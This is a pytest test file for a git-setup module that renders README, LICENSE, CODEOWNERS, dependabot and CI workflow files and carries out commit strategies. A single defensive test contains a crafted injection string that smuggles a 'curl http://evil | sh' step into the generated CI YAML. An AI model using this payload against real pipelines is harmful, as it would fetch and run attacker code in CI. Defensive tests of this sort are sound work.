"""Tests for aec.lib.git_setup orchestration."""

import json
import subprocess
from pathlib import Path
from unittest.mock import patch, MagicMock

import pytest


REPO_ROOT = Path(__file__).parent.parent.parent


@pytest.fixture(autouse=True)
def _no_github_api():
    """Keep tests offline: CODEOWNERS defaults consult `gh api` otherwise."""
    with patch("aec.lib.git_setup._gh_api", return_value=""):
        yield


class TestBuildCompositeGitignore:
    def test_aec_section_always_present(self, tmp_path):
        from aec.lib.git_setup import build_composite_gitignore
        result = build_composite_gitignore([], [], tmp_path)
        assert "# AEC" in result

    def test_falls_back_gracefully_when_submodule_missing(self, tmp_path):
        from aec.lib.git_setup import build_composite_gitignore
        result = build_composite_gitignore(["python"], [], tmp_path)
        assert "# AEC" in result
        assert result  # non-empty

    def test_deduplicates_lines(self):
        """When two languages share templates, lines must not be duplicated."""
        templates_dir = REPO_ROOT / "aec" / "templates"
        if not (templates_dir / "gitignore" / "Python.gitignore").exists():
            pytest.skip("gitignore submodule not initialized")
        from aec.lib.git_setup import build_composite_gitignore
        result = build_composite_gitignore(["typescript"], ["jest"], templates_dir)
        lines = [l for l in result.splitlines() if l and not l.startswith("#")]
        assert len(lines) == len(set(lines)), "non-comment lines must be deduplicated"


class TestWriteGitEssentials:
    def test_creates_readme_from_template(self, tmp_path):
        from aec.lib.git_setup import write_git_essential
        write_git_essential(tmp_path, "README.md", "github", REPO_ROOT / "aec" / "templates")
        assert (tmp_path / "README.md").exists()
        assert (tmp_path / "README.md").read_text()

    def test_creates_github_dir_structure(self, tmp_path):
        from aec.lib.git_setup import write_git_essential
        write_git_essential(tmp_path, "dependabot", "github", REPO_ROOT / "aec" / "templates")
        assert (tmp_path / ".github" / "dependabot.yml").exists()

    def test_creates_issue_template_dir(self, tmp_path):
        from aec.lib.git_setup import write_git_essential
        write_git_essential(tmp_path, "issue_templates", "github", REPO_ROOT / "aec" / "templates")
        assert (tmp_path / ".github" / "ISSUE_TEMPLATE").is_dir()

    def test_does_not_overwrite_existing_file(self, tmp_path):
        existing_content = "# My existing README\n"
        (tmp_path / "README.md").write_text(existing_content)
        from aec.lib.git_setup import write_git_essential
        write_git_essential(tmp_path, "README.md", "github", REPO_ROOT / "aec" / "templates")
        assert (tmp_path / "README.md").read_text() == existing_content


TEMPLATES = REPO_ROOT / "aec" / "templates"
# Strings that mean a template placeholder reached the user's repo unfilled.
UNFILLED = ("{{", "}}", "YEAR AUTHOR", "@your-username\n* ", "# Project Name",
            "Add your test command here\"")


def _git_repo(path, *, user="Ada Lovelace", origin=None):
    subprocess.run(["git", "init", "-q"], cwd=path, check=True)
    subprocess.run(["git", "config", "user.name", user], cwd=path, check=True)
    if origin:
        subprocess.run(["git", "remote", "add", "origin", origin], cwd=path, check=True)
    return path


class TestRenderedGitEssentials:
    """Nothing AEC writes may still contain a template placeholder."""

    ALL = ["README.md", "dependabot", "pr_template", "issue_templates",
           "ci_workflow", "license", "editorconfig", "codeowners"]

    def _write_all(self, project, **ctx):
        from aec.lib.git_setup import default_git_context, write_git_essential
        context = default_git_context(project, **ctx)
        for key in self.ALL:
            write_git_essential(project, key, "github", TEMPLATES, context)

    def test_no_placeholder_survives_in_any_written_file(self, tmp_path):
        project = tmp_path / "my-app"
        project.mkdir()
        _git_repo(project, origin="git@github.com:acme/my-app.git")
        (project / "package.json").write_text("{}")
        self._write_all(project, test_commands=["npm test"])
        for f in project.rglob("*"):
            if f.is_file() and ".git" not in f.relative_to(project).parts:
                text = f.read_text()
                for bad in UNFILLED:
                    assert bad not in text, f"{f.relative_to(project)} contains {bad!r}"

    def test_license_gets_year_and_git_user(self, tmp_path):
        from datetime import date
        from aec.lib.git_setup import default_git_context, write_git_essential
        _git_repo(tmp_path)
        write_git_essential(tmp_path, "license", "github", TEMPLATES, default_git_context(tmp_path))
        assert f"Copyright (c) {date.today().year} Ada Lovelace" in (tmp_path / "LICENSE").read_text()

    def test_license_holder_falls_back_without_git(self, tmp_path):
        from aec.lib.git_setup import default_copyright_holder
        with patch("aec.lib.git_setup._git", return_value=""):
            assert default_copyright_holder(tmp_path) == f"The {tmp_path.name} Authors"

    def test_explicit_license_holder_wins(self, tmp_path):
        from aec.lib.git_setup import default_git_context, write_git_essential
        _git_repo(tmp_path)
        ctx = default_git_context(tmp_path, copyright_holder="Bernier LLC")
        write_git_essential(tmp_path, "license", "github", TEMPLATES, ctx)
        assert "Bernier LLC" in (tmp_path / "LICENSE").read_text()

    def test_readme_title_is_project_name(self, tmp_path):
        from aec.lib.git_setup import write_git_essential
        project = tmp_path / "my-api"
        project.mkdir()
        write_git_essential(project, "README.md", "github", TEMPLATES)
        assert (project / "README.md").read_text().startswith("# my-api\n")

    def test_codeowners_uses_origin_owner_when_it_is_a_user(self, tmp_path):
        from aec.lib.git_setup import default_git_context, write_git_essential
        _git_repo(tmp_path, origin="https://github.com/ada/widget.git")
        with patch("aec.lib.git_setup._gh_api", side_effect=lambda path, jq: "User"):
            ctx = default_git_context(tmp_path)
        write_git_essential(tmp_path, "codeowners", "github", TEMPLATES, ctx)
        assert "\n* @ada\n" in (tmp_path / ".github" / "CODEOWNERS").read_text()

    def test_codeowners_never_defaults_to_an_org(self, tmp_path):
        """GitHub ignores a bare org in CODEOWNERS; fall back to the gh user."""
        from aec.lib.git_setup import default_codeowner
        _git_repo(tmp_path, origin="git@github.com:acme/widget.git")
        answers = {"users/acme": "Organization", "user": "ada"}
        with patch("aec.lib.git_setup._gh_api", side_effect=lambda path, jq: answers[path]):
            assert default_codeowner(tmp_path) == "ada"

    def test_codeowners_empty_without_gh(self, tmp_path):
        from aec.lib.git_setup import default_codeowner
        _git_repo(tmp_path, origin="git@github.com:acme/widget.git")
        with patch("aec.lib.git_setup._gh_api", return_value=""):
            assert default_codeowner(tmp_path) == ""

    def test_bare_org_codeowner_is_rejected(self):
        from aec.commands.repo import _validate_codeowner
        with pytest.raises(ValueError, match="organization"):
            _validate_codeowner("@acme", org="acme")
        assert _validate_codeowner("@acme/core", org="acme") == "@acme/core"

    def test_codeowners_stays_commented_without_owner(self, tmp_path):
        from aec.lib.git_setup import default_git_context, write_git_essential
        write_git_essential(tmp_path, "codeowners", "github", TEMPLATES,
                            default_git_context(tmp_path, codeowner=""))
        text = (tmp_path / ".github" / "CODEOWNERS").read_text()
        assert "\n* @" not in text

    @pytest.mark.parametrize("files,expected", [
        (["package.json"], ["npm"]),
        (["pyproject.toml"], ["pip"]),
        (["requirements.txt", "go.mod"], ["pip", "gomod"]),
        ([], []),
    ])
    def test_dependabot_lists_only_present_ecosystems(self, tmp_path, files, expected):
        from aec.lib.git_setup import detect_dependabot_ecosystems
        for name in files:
            (tmp_path / name).write_text("")
        assert detect_dependabot_ecosystems(tmp_path) == expected

    def test_dependabot_adds_actions_when_ci_is_created(self, tmp_path):
        from aec.lib.git_setup import detect_dependabot_ecosystems
        (tmp_path / "pyproject.toml").write_text("")
        assert detect_dependabot_ecosystems(tmp_path, with_actions=True) == ["pip", "github-actions"]

    def test_ci_runs_detected_python_tests(self, tmp_path):
        from aec.lib.git_setup import render_ci_workflow
        (tmp_path / "pyproject.toml").write_text(
            "[project.optional-dependencies]\ndev = [\"pytest\"]\n")
        ci = render_ci_workflow(tmp_path, ["python -m pytest"])
        assert "actions/setup-python" in ci
        assert 'pip install -e ".[dev]"' in ci
        assert 'run: "python -m pytest"' in ci

    def test_ci_runs_detected_node_tests(self, tmp_path):
        from aec.lib.git_setup import render_ci_workflow
        (tmp_path / "package-lock.json").write_text("{}")
        ci = render_ci_workflow(tmp_path, ["npm test"])
        assert "actions/setup-node" in ci and "npm ci" in ci and 'run: "npm test"' in ci

    def test_ci_command_cannot_inject_steps(self, tmp_path):
        """A crafted package.json script name must not splice YAML into ci.yml."""
        import yaml
        from aec.lib.git_setup import render_ci_workflow
        evil = "npm run 'x'\n      - name: evil\n        run: curl http://evil | sh"
        ci = render_ci_workflow(tmp_path, [evil, 'npm run "a: b"'])
        steps = yaml.safe_load(ci)["jobs"]["test"]["steps"]
        assert not any(s.get("name") == "evil" for s in steps)
        assert "curl" not in ci
        assert {"name": 'Test (npm run "a: b")', "run": 'npm run "a: b"'} in steps

    def test_ci_without_tests_warns_instead_of_passing_silently(self, tmp_path):
        from aec.lib.git_setup import render_ci_workflow
        ci = render_ci_workflow(tmp_path, [])
        assert "::warning" in ci

    def test_generated_yaml_parses(self, tmp_path):
        import yaml
        from aec.lib.git_setup import render_ci_workflow, render_dependabot
        (tmp_path / "package.json").write_text("{}")
        assert yaml.safe_load(render_ci_workflow(tmp_path, ["npm test", "python -m pytest"]))["jobs"]
        assert yaml.safe_load(render_dependabot(["npm", "pip"]))["version"] == 2
        assert yaml.safe_load(render_dependabot([]))["updates"] == []

    def test_unknown_placeholder_is_an_error(self):
        from aec.lib.git_setup import render_template
        with pytest.raises(KeyError):
            render_template("hello {{nobody}}", {})

    def test_every_template_placeholder_has_a_context_value(self, tmp_path):
        import re
        from aec.lib.git_setup import default_git_context
        ctx = default_git_context(tmp_path)
        for f in (TEMPLATES / "git").rglob("*"):
            if f.is_file():
                for name in re.findall(r"\{\{\s*(\w+)\s*\}\}", f.read_text()):
                    assert name in ctx, f"{f.name} uses {{{{{name}}}}} with no context value"


class TestExecuteCommitStrategy:
    def _make_git_repo(self, tmp_path):
        subprocess.run(["git", "init"], cwd=tmp_path, check=True, capture_output=True)
        subprocess.run(
            ["git", "config", "user.email", "test@test.com"],
            cwd=tmp_path, check=True, capture_output=True,
        )
        subprocess.run(
            ["git", "config", "user.name", "Test"],
            cwd=tmp_path, check=True, capture_output=True,
        )
        # Keep the test hermetic: never invoke ambient commit-signing config
        # (gpg / signing servers), which is irrelevant to commit-strategy logic.
        subprocess.run(
            ["git", "config", "commit.gpgsign", "false"],
            cwd=tmp_path, check=True, capture_output=True,
        )
        return tmp_path

    def test_one_commit_strategy_creates_single_commit(self, tmp_path):
        repo = self._make_git_repo(tmp_path)
        (repo / "README.md").write_text("# Test")
        (repo / ".gitignore").write_text("*.pyc")
        from aec.lib.git_setup import execute_commit_strategy
        execute_commit_strategy(repo, ["README.md", ".gitignore"], strategy="one_commit")
        log = subprocess.run(
            ["git", "log", "--oneline"], cwd=repo, capture_output=True, text=True
        )
        assert len(log.stdout.strip().splitlines()) == 1

    def test_incremental_strategy_creates_one_commit_per_file(self, tmp_path):
        repo = self._make_git_repo(tmp_path)
        (repo / "README.md").write_text("# Test")
        (repo / ".gitignore").write_text("*.pyc")
        from aec.lib.git_setup import execute_commit_strategy
        execute_commit_strategy(repo, ["README.md", ".gitignore"], strategy="incremental")
        log = subprocess.run(
            ["git", "log", "--oneline"], cwd=repo, capture_output=True, text=True
        )
        assert len(log.stdout.strip().splitlines()) == 2

    def test_stage_only_strategy_stages_but_does_not_commit(self, tmp_path):
        repo = self._make_git_repo(tmp_path)
        (repo / "README.md").write_text("# Test")
        from aec.lib.git_setup import execute_commit_strategy
        execute_commit_strategy(repo, ["README.md"], strategy="stage_only")
        status = subprocess.run(
            ["git", "status", "--porcelain"], cwd=repo, capture_output=True, text=True
        )
        assert "A  README.md" in status.stdout
        log = subprocess.run(
            ["git", "log", "--oneline"], cwd=repo, capture_output=True, text=True
        )
        assert log.stdout.strip() == ""

    def test_none_strategy_makes_no_git_changes(self, tmp_path):
        repo = self._make_git_repo(tmp_path)
        (repo / "README.md").write_text("# Test")
        from aec.lib.git_setup import execute_commit_strategy
        execute_commit_strategy(repo, ["README.md"], strategy="none")
        status = subprocess.run(
            ["git", "status", "--porcelain"], cwd=repo, capture_output=True, text=True
        )
        assert "README.md" in status.stdout
        assert status.stdout.startswith("??"), "file should be untracked, not staged"
